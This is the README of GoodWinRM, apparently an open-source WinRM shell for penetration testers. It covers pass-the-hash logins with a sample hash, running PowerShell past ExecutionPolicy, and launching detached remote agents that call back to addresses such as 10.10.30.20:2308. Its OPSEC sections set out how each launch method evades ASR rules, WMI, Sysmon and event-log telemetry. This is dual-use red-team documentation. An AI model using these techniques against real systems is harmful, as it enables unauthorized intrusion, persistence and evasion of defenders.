# GoodWinRM

Python WinRM interactive shell with NTLM password/pass-the-hash authentication,
Kerberos ccache support, and chunked file transfer.

![GoodWinRM](.github/goodwinrm.jpg)

Use GoodWinRM only on systems you own or are explicitly authorized to test.

## Features

- Domain and local-account NTLM authentication
- Pass-the-hash with either an NT hash or an `LM:NT` pair
- Kerberos authentication through an existing ccache
- Basic, CredSSP, HTTPS, and certificate transport options supported by `pywinrm`
- Interactive PowerShell with Unicode output and readable error messages
- Working-directory-aware `cd`, `pwd`, and `ls`
- Atomic, chunked upload/download for empty and large binary files
- Quoted local and remote paths, including spaces and Unicode
- Foreground `run`/`exec` of remote binaries with stdout, stderr, and exit code
- Detached `spawn` with stealth launcher selection (`breakaway`, `wmi-native`,
  `wmi-ps`, `schtasks`) that survives disconnect
- Command history, completion, tunable keepalive, custom ports, and endpoint paths

## Installation

GoodWinRM requires Python 3.10 or newer.

```bash
pipx install 'git+https://github.com/SS4ar/goodwinrm.git'
```

Kerberos requires the platform Kerberos libraries and the optional Python
dependency:

```bash
git clone https://github.com/SS4ar/goodwinrm.git
cd goodwinrm
pipx install '.[kerberos]'
```

## Authentication

Password authentication prompts securely when `-p` is omitted:

```bash
goodwinrm -i 192.0.2.10 -u 'DOMAIN\Administrator'
goodwinrm -i 192.0.2.10 -u Administrator -p 'Password123!'
```

Pass-the-hash accepts either the NT hash or a complete `LM:NT` pair:

```bash
goodwinrm -i 192.0.2.10 -u 'DOMAIN\Administrator' -H A87E1E9015421162B6D958BBF7453C8D
```

Kerberos requires a hostname matching the ticket's HTTP SPN and an initialized
ccache:

```bash
goodwinrm -i host.domain.local -t kerberos --ccache /tmp/administrator.ccache
```

For HTTPS or certificate authentication:

```bash
goodwinrm -i host.domain.local -u Administrator -S -p 'Password123!'
goodwinrm -i host.domain.local -t certificate --cert-pem client.pem --cert-key-pem client-key.pem
```

Run `goodwinrm --help` for transport, timeout, certificate, SPN, port, and URL
options.

## Interactive commands

```text
pwd
cd [REMOTE_PATH]
ls [PATTERN]
upload LOCAL_PATH [REMOTE_PATH]
download REMOTE_PATH [LOCAL_PATH]
run EXE [ARGS...]
exec EXE [ARGS...]
runps LOCAL.ps1 [ARGS...]
script | paste
spawn [--launcher MODE] [--stage-dir DIR] [--stdout PATH] [--stderr PATH] EXE [ARGS...]
clear | cls
help | menu
exit
```

The destination is optional for file transfer. Relative remote paths resolve
against the current remote directory. Quote paths containing spaces:

```text
upload "/tmp/tool build.exe" "C:\Windows\Temp\tool build.exe"
download "C:\Windows\Temp\report data.zip" "/tmp/report data.zip"
```

Any other input is executed as PowerShell in the current remote directory.

## Running multi-line scripts

The interactive shell executes one input line per command, so multi-line scripts
cannot be pasted directly. Use one of:

- `runps LOCAL.ps1 [ARGS...]` — reads a **local** script and runs it remotely.
- `script` (alias `paste`) — enters multi-line mode; paste the script and finish
  with a line containing only `.`.

Both run the text as an encoded command wrapped in a script block, so a top-level
`param(...)` is valid and a restrictive ExecutionPolicy (e.g. `AllSigned`) does
not block it — no `.ps1` file is written on the target and `powershell -File` is
not used.

## Running and spawning binaries

`run` (alias `exec`) executes a remote binary in the foreground, prints its
stdout and stderr, and reports its exit code without treating a nonzero code
as a session error. Execution starts in the tracked remote working
directory, and a bare executable name resolves from that directory first,
then from `PATH` (matching `spawn`):

```text
run C:\Windows\Temp\tool.exe --version
exec "C:\Program Files\app\app.exe" "arg with space"
```

`spawn` launches a detached process that survives closing the shell or
dropping the WinRM connection. Options must precede the executable;
everything after the executable is passed to it verbatim:

```text
spawn C:\Windows\Temp\svc.exe -d 10.10.30.20:443 --foreground
spawn --launcher wmi-ps C:\Windows\Temp\svc.exe
spawn --launcher breakaway --stage-dir C:\Windows\Temp C:\Windows\Temp\love.exe -d host:2308
spawn --stdout C:\Windows\Temp\out.log --stderr C:\Windows\Temp\err.log C:\Windows\Temp\job.exe
spawn --schtasks C:\Windows\Temp\svc.exe
```

`--launcher` selects the detachment technique (`auto` by default):

- `auto` tries `breakaway`, then `wmi-native`, then `wmi-ps`, and prints which
  launcher worked. On architectures without a bundled helper it goes straight
  to `wmi-ps`.
- `breakaway` uploads a tiny native helper (bundled as x64 and x86 PE images,
  picked via `PROCESSOR_ARCHITECTURE`) to a dot-prefixed random `.exe` name in
  a space-free staging directory (`C:\Windows\Temp` by default, or
  `--stage-dir DIR`) — the WinRM native command cannot address an executable
  path containing whitespace, while the agent path itself is passed to the
  helper as a quoted argument and may contain spaces — then executes it
  through WinRM as a native command — the launcher→agent step is
  `wsmprovhost → helper → agent` with no `cmd.exe`/`powershell.exe` in the
  agent's ancestry and no `Win32_Process.Create` — and removes it afterwards.
  The helper calls `CreateProcess(CREATE_BREAKAWAY_FROM_JOB)`, which escapes
  the `wsmprovhost` job object because the WinRM job sets
  `JOB_OBJECT_LIMIT_BREAKAWAY_OK`; the agent's parent is the already-exited
  helper and it survives shell close and connection drop. Note that goodwinrm's
  control channel is PowerShell, so a breakaway spawn still issues several
  PowerShell control commands (architecture probe, staging, cleanup), but none
  of them carries the agent's path or arguments.
- `wmi-native` stages the same helper but lets it spawn through WMI
  `Win32_Process.Create`, so the agent is parented by `WmiPrvSE`.
- `wmi-ps` is the classic `Invoke-CimMethod Win32_Process.Create` through
  PowerShell; the agent is parented by `WmiPrvSE`.
- `schtasks` (also the legacy `--schtasks` flag) launches through a
  self-deleting one-time scheduled task as `NT AUTHORITY\SYSTEM` with highest
  privileges, so its identity differs from the other launchers, which inherit
  the WinRM session user. No PID is returned, only the random task name; the
  task's last result is verified before success is reported.

`breakaway` and `wmi-native` do not support `--stdout`/`--stderr`; when
redirection is requested they (and `auto`) use `wmi-ps` instead, where the
printed PID belongs to the `cmd.exe` wrapper and the agent's parent is
`cmd.exe`. A typical authorized-lab flow:

```text
upload agent.exe C:\Windows\Temp\agent.exe
spawn --launcher breakaway C:\Windows\Temp\agent.exe -d 10.10.30.20:2308
```

### Stealth launch (OPSEC)

Launcher tradeoffs observed on Windows 10 19045:

| Launcher | Agent parent | Survives disconnect | Telemetry |
|---|---|---|---|
| `breakaway` | helper (already exited) | yes | no WMI use at all, so no `Win32_Process.Create` and no exposure to ASR rule d1e49aac; the control-channel PowerShell commands appear in 4688/Sysmon 1 where enabled, but none of them carries the agent's path or arguments |
| `wmi-native` | `WmiPrvSE.exe` | yes | WMI-Activity may be logged depending on host configuration (delta was 0 on the tested host); concrete WMI risk: ASR rule d1e49aac ("Block process creations from PSExec and WMI commands"); 4688/Sysmon 1 for the agent where enabled |
| `wmi-ps` | `WmiPrvSE.exe` | yes | same WMI exposure as `wmi-native` plus `powershell.exe -EncodedCommand` carrying the full agent command line in 4688/Sysmon 1/4104 |
| `schtasks` | task scheduler service | yes (reboot persistence possible) | 4698 task registration and 7045-style service events; runs as SYSTEM |

Process-creation telemetry (4688/Sysmon 1) is only observable where those audit
sources are enabled; on the test host Security 4688 auditing was off and the
WMI launches produced no WMI-Activity events at all. A breakaway spawn trades
more `powershell.exe` control commands (probe, staging, cleanup) for a native
launch step whose command line never transits PowerShell.

PPID spoofing is deliberately not implemented: on the tested build a
`PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` child stayed inside the WinRM job
object and died with the shell, because the attribute does not confer
breakaway.

## Keepalive

A background thread runs a tiny PowerShell command every 45 seconds to keep
idle WinRM sessions from being reaped. Disable it or change the cadence with
`--no-keepalive` and `--keepalive-interval SECONDS` (0 disables). Every
keepalive invocation is an additional `powershell.exe` on the target, so quieter
intervals trade session stability for less process telemetry.

## OPSEC / detection tradeoffs

GoodWinRM favors simplicity over stealth. Known artifacts and tradeoffs:

- All remote logic runs as `powershell.exe -EncodedCommand` with a base64
  UTF-16LE payload. The full script is recoverable from process command
  lines and is visible in Security event 4688, Sysmon Event 1, and
  PowerShell script-block logging (4104).
- `spawn` defaults to the `breakaway` launcher: the staged helper and the
  agent still appear in Security 4688/Sysmon 1 where those sources are
  enabled, but no WMI is involved (no `Win32_Process.Create`, no ASR
  d1e49aac exposure), no task or SCM events are generated, and no
  `cmd.exe`/`powershell.exe` wrapper is used for the launch itself; the
  `wmi-native`/`wmi-ps` and `--schtasks` fallbacks produce the telemetry
  listed in the stealth launch table above.
- The native launcher helper is staged under a dot-prefixed random `.exe`
  name next to the target (or in `--stage-dir`) and removed after launch;
  only x64 and x86 helper images are bundled, other architectures fall back
  to `wmi-ps`.
- Uploads stage a short-lived dot-prefixed temporary file next to the
  destination; the dot prefix is name mimicry only and does not set the
  Windows Hidden attribute. The file is atomically moved into place and
  removed on failure; the final uploaded file itself keeps a normal name.
- Each keepalive tick is a separate `powershell.exe` invocation
  (4104/4688); tune or disable it with the keepalive options.
- AMSI and ETW are not bypassed; that is deliberately out of scope.
- Credentials are prompted securely and are never printed or logged.

## Testing

See [TESTING.md](TESTING.md) for the unit/integration matrix and opt-in E2E lab
configuration.
